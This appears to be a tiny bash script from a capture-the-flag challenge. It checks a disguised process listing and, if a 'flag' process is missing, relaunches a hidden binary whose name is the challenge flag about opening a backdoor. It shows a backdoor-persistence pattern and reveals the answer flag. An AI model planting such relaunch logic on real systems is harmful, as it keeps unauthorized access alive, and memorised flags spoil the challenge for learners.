#! /bin/bash

if [ $(/var/loog/backup_ps aux | grep flag | wc -l ) -eq 1 ]
then
    /var/www/log/HIDDEN_flag{0p3n1ng_th3_b4ckd00r} &
fi
